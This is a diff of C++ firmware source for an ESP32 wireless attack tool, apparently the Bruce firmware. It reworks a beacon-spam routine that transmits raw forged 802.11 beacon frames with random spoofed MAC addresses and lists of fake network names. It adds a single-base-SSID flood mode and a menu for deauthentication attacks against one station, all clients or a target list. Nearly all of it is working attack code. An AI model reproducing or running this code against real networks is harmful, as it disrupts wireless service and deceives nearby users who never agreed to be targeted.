                                 "I Believe Wi Can Fi\n"
                                 "Tell My Wi-Fi Love Her\n"
@@ -356,6 +734,7 @@ const char Beacons[] PROGMEM = {"Mom Use This One\n"
                                 "VIRUS.EXE\n"
                                 "Virus-Infected Wi-Fi\n"
                                 "Starbucks Wi-Fi\n"
+#endif
                                 "Text 64ALL for Password\n"
                                 "Yell BRUCE for Password\n"
                                 "The Password Is 1234\n"
@@ -382,246 +761,76 @@ const char rickrollssids[] PROGMEM = {"01 Never gonna give you up\n"
                                       "07 Never gonna tell a lie\n"
                                       "08 and hurt you\n"};
 
-const uint8_t packet[128] = {
-    0x80,
-    0x00,
-    0x00,
-    0x00, // Frame Control, Duration
-    /*4*/ 0xff,
-    0xff,
-    0xff,
-    0xff,
-    0xff,
-    0xff, // Destination address
-    /*10*/ 0x01,
-    0x02,
-    0x03,
-    0x04,
-    0x05,
-    0x06, // Source address - overwritten later
-    /*16*/ 0x01,
-    0x02,
-    0x03,
-    0x04,
-    0x05,
-    0x06, // BSSID - overwritten to the same as the source address
-    /*22*/ 0xc0,
-    0x6c, // Seq-ctl
-    /*24*/ 0x83,
-    0x51,
-    0xf7,
-    0x8f,
-    0x0f,
-    0x00,
-    0x00,
-    0x00, // timestamp - the number of microseconds the AP has been active
-    /*32*/ 0x64,
-    0x00, // Beacon interval
-    /*34*/ 0x01,
-    0x04, // Capability info
-          /* SSID */
-    /*36*/ 0x00
-};
-
-// goes to next channel
-const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}; // used Wi-Fi channels (available: 1-14)
-uint8_t channelIndex = 0;
-uint8_t wifi_channel = 1;
-
-void nextChannel() {
-    if (sizeof(channels) > 1) {
-        uint8_t ch = channels[channelIndex];
-        channelIndex++;
-        if (channelIndex > sizeof(channels)) channelIndex = 0;
-
-        if (ch != wifi_channel && ch >= 1 && ch <= 14) {
-            wifi_channel = ch;
-            // wifi_set_channel(wifi_channel);
-            esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
-        }
-    }
-}
 void beaconSpamList(const char list[]) {
-    // beacon frame definition
-    uint8_t beaconPacket[109] = {/*  0 - 3  */ 0x80,
-                                 0x00,
-                                 0x00,
-                                 0x00, // Type/Subtype: managment beacon frame
-                                 /*  4 - 9  */ 0xFF,
-                                 0xFF,
-                                 0xFF,
-                                 0xFF,
-                                 0xFF,
-                                 0xFF, // Destination: broadcast
-                                 /* 10 - 15 */ 0x01,
-                                 0x02,
-                                 0x03,
-                                 0x04,
-                                 0x05,
-                                 0x06, // Source
-                                 /* 16 - 21 */ 0x01,
-                                 0x02,
-                                 0x03,
-                                 0x04,
-                                 0x05,
-                                 0x06, // Source
-
-                                 // Fixed parameters
-                                 /* 22 - 23 */ 0x00,
-                                 0x00, // Fragment & sequence number (will be done by the SDK)
-                                 /* 24 - 31 */ 0x83,
-                                 0x51,
-                                 0xf7,
-                                 0x8f,
-                                 0x0f,
-                                 0x00,
-                                 0x00,
-                                 0x00, // Timestamp
-                                 /* 32 - 33 */ 0xe8,
-                                 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
-                                 /* 34 - 35 */ 0x31,
-                                 0x00, // capabilities Tnformation
-
-                                 // Tagged parameters
-
-                                 // SSID parameters
-                                 /* 36 - 37 */ 0x00,
-                                 0x20, // Tag: Set SSID length, Tag length: 32
-                                 /* 38 - 69 */ 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20,
-                                 0x20, // SSID
-
-                                 // Supported Rates
-                                 /* 70 - 71 */ 0x01,
-                                 0x08,          // Tag: Supported Rates, Tag length: 8
-                                 /* 72 */ 0x82, // 1(B)
-                                 /* 73 */ 0x84, // 2(B)
-                                 /* 74 */ 0x8b, // 5.5(B)
-                                 /* 75 */ 0x96, // 11(B)
-                                 /* 76 */ 0x24, // 18
-                                 /* 77 */ 0x30, // 24
-                                 /* 78 */ 0x48, // 36
-                                 /* 79 */ 0x6c, // 54
-
-                                 // Current Channel
-                                 /* 80 - 81 */ 0x03,
-                                 0x01,          // Channel set, length
-                                 /* 82 */ 0x01, // Current Channel
-
-                                 // RSN information
-                                 /*  83 -  84 */ 0x30,
-                                 0x18,
-                                 /*  85 -  86 */ 0x01,
-                                 0x00,
-                                 /*  87 -  90 */ 0x00,
-                                 0x0f,
-                                 0xac,
-                                 0x02,
-                                 /*  91 -  92 */ 0x02,
-                                 0x00,
-                                 /*  93 - 100 */ 0x00,
-                                 0x0f,
-                                 0xac,
-                                 0x04,
-                                 0x00,
-                                 0x0f,
-                                 0xac,
-                                 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not
-                                          supported by many devices*/
-                                 /* 101 - 102 */ 0x01,
-                                 0x00,
-                                 /* 103 - 106 */ 0x00,
-                                 0x0f,
-                                 0xac,
-                                 0x02,
-                                 /* 107 - 108 */ 0x00,
-                                 0x00};
-
-    // temp variables
-    int i = 0;
-    int j = 0;
-    char tmp;
+    uint8_t beaconPacket[BEACON_PKT_LEN];
     uint8_t macAddr[6];
+    int i = 0;
     int ssidsLen = strlen_P(list);
 
-    // go to next channel
     nextChannel();
 
     while (i < ssidsLen) {
-        // read out next SSID
-        // read out next SSID
-        j = 0;
+        char ssidBuf[32];
+        int j = 0;
+        char tmp;
         do {
             tmp = pgm_read_byte(list + i + j);
+            if (j < 32 && tmp != '\n') ssidBuf[j] = tmp;
             j++;
-        } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);
+        } while (tmp != '\n' && i + j < ssidsLen);
 
-        uint8_t ssidLen = j - 1;
+        uint8_t ssidLen = (j > 32) ? 32 : j - 1;
 
-        // set MAC address
         generateRandomWiFiMac(macAddr);
-
-        // write MAC address into beacon frame
-        memcpy(&beaconPacket[10], macAddr, 6);
-        memcpy(&beaconPacket[16], macAddr, 6);
-
-        // reset SSID
-        memcpy(&beaconPacket[38], emptySSID, 32);
-
-        // write new SSID into beacon frame
-        memcpy_P(&beaconPacket[38], &list[i], ssidLen);
-        // set channel for beacon frame
-        beaconPacket[82] = wifi_channel;
-        beaconPacket[34] = 0x31; // wpa
-
-        // send packet
-        for (int k = 0; k < 3; k++) {
-            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), 0);
-            vTaskDelay(1 / portTICK_RATE_MS);
+        size_t pktLen = prepareBeaconPacket(beaconPacket, macAddr, ssidBuf, ssidLen, wifi_channel, true);
+        for (int k = 0; k < 2; k++) {
+            wifiRawTx(WIFI_IF_STA, beaconPacket, pktLen);
+            vTaskDelay(1 / portTICK_PERIOD_MS);
         }
+
         i += j;
-        if (EscPress) break; // Check the variable without changing it
+        if (EscPress) break;
+    }
+}
+
+void beaconSpamSingle(String baseSSID) {
+    uint8_t beaconPacket[BEACON_PKT_LEN];
+    uint8_t macAddr[6];
+    int counter = 1;
+
+    nextChannel();
+
+    while (true) {
+        String currentSSID = baseSSID + String(counter);
+        if (currentSSID.length() > 32) { currentSSID = currentSSID.substring(0, 32); }
+        uint8_t ssidLen = currentSSID.length();
+
+        generateRandomWiFiMac(macAddr);
+        size_t pktLen =
+            prepareBeaconPacket(beaconPacket, macAddr, currentSSID.c_str(), ssidLen, wifi_channel, true);
+        for (int k = 0; k < 2; k++) {
+            wifiRawTx(WIFI_IF_STA, beaconPacket, pktLen);
+            vTaskDelay(1 / portTICK_PERIOD_MS);
+        }
+
+        counter++;
+        if (counter > 9999) {
+            counter = 1;
+            nextChannel();
+        }
+        if (EscPress) break;
     }
 }
 
 void beaconAttack() {
-    // change WiFi mode
-    WiFi.mode(WIFI_MODE_STA);
+    resetGlobalState();
+    if (!wifi_atk_setWifi()) return;
+
     int BeaconMode;
     String txt = "";
-    // create empty SSID
+    String singleSSID = "";
     for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
-    // for random generator
-    randomSeed(1);
+    srand(millis());
     options = {
         {"Funny SSID",
          [&]() {
@@ -638,18 +847,31 @@ void beaconAttack() {
              BeaconMode = 2;
              txt = "Spamming Random";
          }                        },
+#if !defined(LITE_VERSION)
+        {"Single SSID",
+         [&]() {
+             BeaconMode = 4;
+             txt = "Spamming Single";
+         }                        },
         {"Custom SSIDs", [&]() {
              BeaconMode = 3;
              txt = "Spamming Custom";
          }},
+#endif
     };
     addOptionToMainMenu();
     loopOptions(options);
 
-    wifiConnected = true; // display wifi icon
+    wifiConnected = true;
     String beaconFile = "";
     File file;
     FS *fs;
+#if !defined(LITE_VERSION)
+    if (BeaconMode == 4) {
+        singleSSID = keyboard("BruceBeacon", 26, "Base SSID:");
+        if (singleSSID.length() == 0 || singleSSID == "\x1B") { return; }
+    }
+#endif
     if (BeaconMode != 3) {
         drawMainBorderWithTitle("WiFi: Beacon SPAM");
         displayTextLine(txt);
@@ -663,6 +885,10 @@ void beaconAttack() {
         } else if (BeaconMode == 2) {
             char *randoms = randomSSID();
             beaconSpamList(randoms);
+        }
+#if !defined(LITE_VERSION)
+        else if (BeaconMode == 4) {
+            beaconSpamSingle(singleSSID);
         } else if (BeaconMode == 3) {
             if (!file) {
                 options = {};
@@ -676,7 +902,7 @@ void beaconAttack() {
 
                 loopOptions(options);
                 if (fs != nullptr) beaconFile = loopSD(*fs, true, "TXT");
-                else goto END;
+                else return;
                 file = fs->open(beaconFile, FILE_READ);
                 beaconFile = file.readString();
                 beaconFile.replace("\r\n", "\n");
@@ -688,11 +914,24 @@ void beaconAttack() {
             const char *randoms = beaconFile.c_str();
             beaconSpamList(randoms);
         }
+#endif
         if (check(EscPress) || returnToMenu) {
             if (BeaconMode == 3) file.close();
             break;
         }
     }
-END:
-    wifiDisconnect();
+    wifi_atk_unsetWifi();
+}
+
+void enhancedDeauthMenu() {
+    resetGlobalState();
+
+    options = {
+        {"Station Deauth (Single)", [=]() { showTargetSelection(); } },
+        {"Deauth All Clients",      [=]() { deauthAllMenu(); }       },
+        {"Deauth Target List",      [=]() { deauthTargetListMenu(); }},
+        {"Back",                    [=]() { returnToMenu = true; }   },
+    };
+    addOptionToMainMenu();
+    loopOptions(options);
 }
